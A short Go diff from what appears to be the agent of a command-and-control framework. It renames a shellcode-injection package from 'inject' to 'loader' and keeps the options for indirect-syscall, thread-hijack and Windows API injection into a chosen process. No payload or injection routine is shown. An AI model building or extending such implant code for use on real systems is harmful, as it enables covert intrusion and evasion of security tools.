@@ -9,7 +9,7 @@ import (
 
 	"github.com/aegis-c2/aegis/agent/bof"
 	"github.com/aegis-c2/aegis/agent/dotnet"
-	"github.com/aegis-c2/aegis/agent/inject"
+	"github.com/aegis-c2/aegis/agent/loader"
 )
 
 // BOFModule 加载并执行 Beacon Object File (COFF)。
@@ -102,7 +102,7 @@ func InjectModule(args string) (string, string, int) {
 		}
 	}
 
-	cfg := &inject.InjectConfig{
+	cfg := &loader.LoadConfig{
 		PID:       pid,
 		Shellcode: shellcode,
 	}
@@ -111,15 +111,15 @@ func InjectModule(args string) (string, string, int) {
 	if len(parts) >= 3 {
 		switch parts[2] {
 		case "syscall":
-			cfg.Method = inject.MethodIndirectSyscall
+			cfg.Method = loader.MethodIndirectSyscall
 		case "hijack":
-			cfg.Method = inject.MethodThreadHijack
+			cfg.Method = loader.MethodThreadHijack
 		default:
-			cfg.Method = inject.MethodWindowsAPI
+			cfg.Method = loader.MethodWindowsAPI
 		}
 	}
 
-	result := inject.Inject(cfg)
+	result := loader.Load(cfg)
 	if !result.Success {
 		return "", result.Message, 1
 	}
